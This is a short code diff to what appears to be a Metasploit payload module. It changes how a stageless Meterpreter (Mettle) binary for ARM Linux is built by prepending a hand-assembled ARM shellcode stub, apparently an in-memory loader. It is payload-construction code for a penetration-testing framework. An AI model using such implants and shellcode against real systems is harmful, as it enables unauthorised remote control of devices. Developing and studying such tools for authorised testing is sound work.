@@ -38,6 +38,18 @@ module MetasploitModule
       scheme: 'tcp',
       stageless: true
     }.merge(mettle_logging_config)
-    MetasploitPayloads::Mettle.new('armv5l-linux-musleabi', generate_config(opts)).to_binary :exec
+    payload = MetasploitPayloads::Mettle.new('armv5l-linux-musleabi', generate_config(opts)).to_binary :exec
+    in_memory_loader_asm = %Q^
+	start:
+		mov r0,0x0;
+		mov r1, 0x1;
+		mov r7, 0x83;
+		add r7, 0xfe;
+		svc 0x0;
+	^
+     	in_memory_loader = [0x0000a0e3, 0x0110a0e3, 0x8370a0e3, 0xfe7087e2, 0x000000ef].pack('V*')
+
+	#in_memory_loader = Metasm::Shellcode.assemble(Metasm::ARM.new, in_memory_loader_asm).encode_string
+	in_memory_loader + payload
   end
 end
